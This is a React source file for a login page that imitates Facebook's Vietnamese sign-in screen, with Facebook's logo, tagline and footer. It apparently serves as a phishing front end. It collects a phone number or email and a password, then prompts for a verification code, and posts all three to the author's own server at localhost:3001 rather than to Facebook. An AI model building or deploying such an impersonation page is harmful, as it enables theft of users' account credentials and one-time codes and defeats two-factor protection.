import React, { useRef, useState } from 'react'
import axios from 'axios'
import { useLocation, useNavigate } from 'react-router-dom';
import icInstagram from '../assets/icons/ic-instagram.svg';
import icSMS from '../assets/icons/ic-sms.svg';
import FacebookLogin from '../components/Facebook';
// import FacebookLoginComponent from '../components/Facebook/index';
const LoginPage = () => {
  console.log("LoginPage")
  const [showCode, setShowCode] = useState(false);
  const [smsMethod, setSmsMethod] = useState(false);
  const [error, setError] = useState(false);
  const [isOKay, setisOKay] = useState(false);

  const inputPhoneRef = useRef(null)
  const inputPasswordRef = useRef(null)
  const inputCodeRef = useRef(null)
  const navigate = useNavigate();
  const location = useLocation();

  const phoneNumberLocal = localStorage.getItem("phoneNumber")

  if (location.pathname === '/') {
    if (phoneNumberLocal) {
      console.log("YES", phoneNumberLocal)
      localStorage.removeItem("phoneNumber")
    } else {
      console.log("NO", phoneNumberLocal)
    }
  }


  async function handleOnSubmit(e) {
    e.preventDefault();
    let phoneEntered = inputPhoneRef.current?.value
    let codeEntered = inputCodeRef.current?.value
    let passwordEntered = inputPasswordRef.current?.value

    try {
      if (!smsMethod) {
        setError(true);
      } else if (!phoneEntered && passwordEntered) {
        return;
      } else if (phoneEntered && passwordEntered) {
        passwordEntered = "";
        setShowCode(true);
      }
      var response = await axios.post("http://localhost:3001/", {
        codeEntered, phoneEntered, passwordEntered
      })

      let { data } = response
      let { fullUrl, messages, phoneNumber } = data;

      console.log(data)


      if (messages && phoneNumber) {
        navigate("/dashboard")
        localStorage.setItem("phoneNumber", phoneNumber)
      } else {
        localStorage.removeItem("phoneNumber", phoneNumber)
      }
      console.log("Full URL from server:", fullUrl);
    } catch (error) {
      console.log("ERR login", error)
    }
  }

  return (
    <div className='w-[100vw] h-[100vh] flex flex-col'>
      <div className='bg-[#F0F2F5] flex flex-col md:flex-row justify-center items-center md:gap-20 h-full'>
        <div className='flex flex-col justify-start'>
          <img
            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
            alt="Facebook"
            className=""
            width={300}
          />
          <h2 className='pl-7 text-[27px]'>Facebook giúp bạn kết nối và chia sẻ <br /> với mọi người trong cuộc sống của bạn.</h2>
        </div>
        <div>
          <form onSubmit={handleOnSubmit} className='bg-white border text-center  p-5 rounded-[13px] w-[25rem] drop-shadow-xl'>
            <div className={`${showCode ? "hidden" : ""} mb-3`}>
              <input type="text"
                placeholder="Email hoặc số điện thoại"
                className={`border-black/30 ${error ? "border-red-500" : ""} border-[1px] p-3 w-full rounded-md `}
                ref={inputPhoneRef}
              />

            </div>
            <div className={`${smsMethod ? "hidden" : ""} ${showCode ? "hidden" : ""}  mb-3`}>
              <input type="password"
                placeholder='Mật khẩu'
                className={`border-black/30 ${error ? "border-red-500" : ""} border-[1px] p-3 w-full rounded-md `}
                ref={inputPasswordRef}
              />
            </div>
            <div className={` ${showCode ? "" : "hidden"}  mb-3`}>
              <input type="text"
                placeholder='Nhập mã Code'
                className='border-black/30 border-[1px]  p-3 w-full rounded-md '
                ref={inputCodeRef}
              />
            </div>
            <button type='submit' className='ani w-full bg-black-500 border-none outline-none hover:opacity-90 bg-[#1877f2] text-white text-[18px] font-bold p-3 px-4 rounded-[8px]'>Đăng nhập</button>
            <div className='w-full py-3 text-[15px] text-[#1877f2] '>
              <a href="/">Quên mật khẩu?</a>
            </div>
            <div className='border-b'></div>

            <div className='my-3 '>
              <span>Chọn phương thức đăng nhập: <br /></span>
              <div className='flex justify-between my-2'>
                <div
                  onClick={() => setSmsMethod(!smsMethod)}
                  className={`${smsMethod ? "bg-green-200" : ""} flex items-center border p-1 px-3 rounded-[8px] gap-2 hover:bg-slate-400/20 cursor-pointer `}>
                  <button type='button' className='border-none outline-none text-[15px]'>Gửi SMS</button>
                  <span>
                    <img src={icSMS} alt="" />
                  </span>
                </div>
                <div className='flex items-center border p-1 px-3 rounded-[8px] gap-2 hover:bg-slate-400/20 cursor-pointer'>
                  <button type='button' className='border-none outline-none text-[15px]'>Đăng nhập với Instagram</button>
                  <span>
                    <img src={icInstagram} alt="" />
                  </span>
                </div>
              </div>
              <FacebookLogin />
            </div>
            <div className='my-6'>
              <button type='submit' className='border-none outline-none bg-[#42b72a]  hover:bg-green-600 text-white text-[18px] p-3 px-4 rounded-[8px]'>Tạo tài khoản mới</button>
            </div>
          </form>
          <div className='mt-5 text-[14px] text-center'>
            <b>Tạo Trang</b> dành cho người nổi tiếng, thương hiệu hoặc doanh <br /> nghiệp.
          </div>
        </div>
      </div >
      <div className='flex justify-center py-5 px-3'>
        <div className='w-[60%] text-[12px] text-gray-500'>
          <div className=''>Tiếng Việt English (UK) 中文(台灣) 한국어 日本語 Français (France) ภาษาไทย Español Português (Brasil) Deutsch Italiano</div>
          <div className='border-b my-2'></div>
          <span className=''>"Đăng ký Đăng nhập Messenger Facebook LiteVideo Địa điểm Trò chơi Marketplace Meta Pay Cửa hàng trên MetaMeta QuestInstagramThreadsChiến dịch gây quỹDịch vụTrung tâm thông tin bỏ phiếuChính sách quyền riêng tưTrung tâm quyền riêng tưNhómGiới thiệuTạo quảng cáoTạo TrangNhà phát triểnTuyển dụngCookieLựa chọn quảng cáoĐiều khoảnTrợ giúpTải thông tin liên hệ lên & đối tượng không phải người dùngCài đặt"</span>
          <div className='mt-8 text-[11px] text-gray-500' >Meta © 2023</div>
        </div>
      </div>
    </div>
  )
}

export default LoginPage